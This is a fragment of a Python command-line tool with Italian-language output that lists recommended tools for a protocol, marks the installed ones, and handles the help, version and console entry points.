        text_parts.extend(["", "--- TOOL CONSIGLIATI (installa con 'use <tool>' + 'install') ---", ""])
        for t in proto["tool_consigliati"]:
            installed = "✓" if which(t) else " "
            text_parts.append(f"  [{installed}] {t}")

    text_parts.extend(["", sep, ""])
    print("\n".join(text_parts))
    return 0


def main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]

    if not argv:
        return run_console()

    if len(argv) == 1 and argv[0] in {"-h", "--help"}:
        print_banner()
        print_help_text()
        return 0

    if len(argv) == 1 and argv[0] == "--version":
        print(f"{APP_NAME} {VERSION}")
        return 0

    return run_command(argv, ConsoleState())


if __name__ == "__main__":
    raise SystemExit(main())
